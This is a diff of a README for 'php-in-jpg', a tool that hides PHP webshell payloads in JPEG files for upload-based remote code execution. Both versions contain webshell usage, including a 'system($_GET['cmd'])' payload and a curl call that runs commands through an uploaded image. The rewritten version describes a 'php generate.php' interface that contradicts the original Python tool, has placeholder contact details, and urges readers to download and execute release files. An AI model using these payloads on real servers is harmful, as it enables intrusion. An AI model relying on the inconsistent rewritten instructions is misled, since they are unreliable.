@@ -1,108 +1,129 @@
-# php-in-jpg
+# php-in-jpg 🖼️💻
 
-**php-in-jpg** is a simple but flexible tool that generates `.jpg` image files embedding PHP payloads.  
-It supports two techniques:
+![GitHub Repo stars](https://img.shields.io/github/stars/Mxzinedits/php-in-jpg?style=social) ![GitHub forks](https://img.shields.io/github/forks/Mxzinedits/php-in-jpg?style=social) ![GitHub issues](https://img.shields.io/github/issues/Mxzinedits/php-in-jpg?style=social)
 
-- **Inline payload**: appends PHP code directly to the image
-- **EXIF metadata injection**: embeds the payload in the image's comment field using `exiftool`.
+php-in-jpg is a simple yet flexible tool that generates .jpg image files embedding PHP payloads, designed to support PHP RCE polyglot techniques. This project is aimed at security researchers and penetration testers looking to explore the potential of PHP in unconventional formats.
 
-By default, the payload uses the **GET-based execution mode** (`?cmd=your_command`) unless a fixed command is specified.
+## Table of Contents
 
-This tool is designed to support **PHP RCE polyglot techniques**, often used in upload-based exploitation scenarios or webshell demonstrations.
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-![PoC demo](screenshots/poc.png)
+## Features
 
----
+- **Simple to Use**: Generate .jpg files with embedded PHP payloads easily.
+- **Flexible**: Supports various PHP payloads for different scenarios.
+- **Polyglot Support**: Ideal for RCE (Remote Code Execution) testing.
+- **Lightweight**: Minimal dependencies for quick setup.
 
-## 🛠️ Features
+## Installation
 
-- Embed PHP payload directly or via EXIF metadata
-- Choose between a **fixed command** or `?cmd=` **GET-based execution**
-- Support for custom or default HTML/PHP templates with `{{COMMAND}}` and `{{OUTPUT}}`
-- Optional preview-only mode: show payload without writing files
-- Clean HTML output styling (terminal-like, via default template)
-
----
-
-## 🚀 Usage
-
-```bash
-python php-in-jpg.py -m <method> [options]
-```
-
-### Available options:
-
-| Option                | Description                                                                 |
-|-----------------------|-----------------------------------------------------------------------------|
-| `-m, --method`        | Insertion method: `inline` or `metadata` (**required**)                     |
-| `-c, --cmd-mode`      | Command mode: `fixed` (static command) or `get` (dynamic via `?cmd=`). Default is `get`. |
-| `-x, --fixed-cmd`     | Fixed shell command to embed (required if `--cmd-mode fixed`)               |
-| `-o, --output`        | Output file name (e.g. `payload.php.jpg`)                                   |
-| `-t, --template`      | Optional template with `{{COMMAND}}` and `{{OUTPUT}}` placeholders          |
-| `--show-payload`      | Print PHP payload to screen only, no file creation                          |
-
----
-
-## 📦 Examples
+To get started with php-in-jpg, you need to clone the repository and install the necessary dependencies. Use the following commands:
 
 ```bash
-# Embed a fixed command using inline method
-python php-in-jpg.py -m inline -c fixed -x "whoami" -o shell.php.jpg
-
-# Embed dynamic GET-based payload via EXIF (default cmd-mode)
-python php-in-jpg.py -m metadata -o payload.php.jpg
-
-# Access via browser or curl: payload.php.jpg?cmd=pwd
-curl "http://target/upload/payload.php.jpg?cmd=pwd"
-
-# Just preview the generated PHP code
-python php-in-jpg.py -m inline -c fixed -x "ls -l" --show-payload
+git clone https://github.com/Mxzinedits/php-in-jpg.git
+cd php-in-jpg
 ```
 
----
+Make sure you have PHP installed on your machine. You can check this by running:
 
-### 💻 Example CLI Output
-
-```
-$ python php-in-jpg.py -m inline -c fixed -x "ls -l"
-[+] File generated: jpg_poc_fixed_inline_20250408_134033.php.jpg
-[!] Embedded command: ls -l
-
-$ python php-in-jpg.py -m inline -c fixed -x "ls -l" -t wrong_path
-[-] Error: template file not found at: wrong_path
-
-$ python php-in-jpg.py -m inline -c fixed -x "pwd" -t template/custom.tpl -o output.php.jpg
-[+] File generated: output.php.jpg
-[!] Embedded command: pwd
-
-$ python php-in-jpg.py -m metadata -c fixed -x "whoami" -o output.php.jpg
-    1 image files updated
-[+] File generated: output.php.jpg
-[!] Embedded command: whoami
+```bash
+php -v
 ```
 
----
+If you don't have PHP installed, please follow the instructions on the [official PHP website](https://www.php.net/manual/en/install.php).
 
-## 📁 Template system
+## Usage
 
-Templates must contain the following placeholders:
+After installation, you can generate a .jpg file with a PHP payload. The command structure is as follows:
 
-- `{{COMMAND}}`: replaced with the displayed command
-- `{{OUTPUT}}`: replaced with the actual `system(...)` or similar execution block
+```bash
+php generate.php [payload] [output.jpg]
+```
 
-A default template is located in: `template/default.tpl`
+### Parameters
 
----
+- `payload`: The PHP code you want to embed.
+- `output.jpg`: The name of the output file.
 
-## 🔧 Requirements
+For example, to create a .jpg file with a simple PHP payload, you would run:
 
-- Python 3
-- Python dependencies: install via `pip install -r requirements.txt`
-- `exiftool` (external tool, used for metadata injection)
+```bash
+php generate.php "<?php phpinfo(); ?>" output.jpg
+```
 
----
+## Examples
 
-## ⚠️ Disclaimer
+Here are a few examples of using php-in-jpg:
 
-This tool is for **educational and authorized testing purposes only**.  
-Do not use it in unauthorized environments.
+### Example 1: Basic PHP Payload
+
+```bash
+php generate.php "<?php echo 'Hello, World!'; ?>" hello.jpg
+```
+
+This command generates a .jpg file named `hello.jpg` that, when executed on a server, will display "Hello, World!".
+
+### Example 2: RCE Payload
+
+```bash
+php generate.php "<?php system($_GET['cmd']); ?>" rce.jpg
+```
+
+This command creates an image that allows for command execution via the `cmd` GET parameter.
+
+### Example 3: Polyglot Usage
+
+You can also use php-in-jpg to create polyglot files that serve multiple purposes. For instance:
+
+```bash
+php generate.php "<?php echo 'Polyglot!'; ?>" polyglot.jpg
+```
+
+This file can be interpreted as both a valid image and a PHP script.
+
+## Contributing
+
+We welcome contributions to php-in-jpg! If you have suggestions or improvements, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes and commit them (`git commit -m 'Add new feature'`).
+4. Push to the branch (`git push origin feature/YourFeature`).
+5. Open a pull request.
+
+Please ensure your code follows the existing style and includes appropriate tests.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or suggestions, feel free to reach out:
+
+- **Author**: [Your Name](https://github.com/YourGitHubProfile)
+- **Email**: your.email@example.com
+
+## Releases
+
+You can find the latest releases of php-in-jpg [here](https://github.com/Mxzinedits/php-in-jpg/releases). Download the latest version and execute the file as needed.
+
+To stay updated, visit the [Releases](https://github.com/Mxzinedits/php-in-jpg/releases) section regularly.
+
+## Acknowledgments
+
+- Thanks to the open-source community for their continuous support and contributions.
+- Special thanks to the developers of the libraries used in this project.
+
+## Conclusion
+
+php-in-jpg provides a unique way to generate images that can also execute PHP code. This tool is a valuable asset for penetration testers and security researchers. With its simple interface and flexible capabilities, you can explore various RCE techniques effectively.
+
+We hope you find this tool useful in your security assessments. Happy hacking!
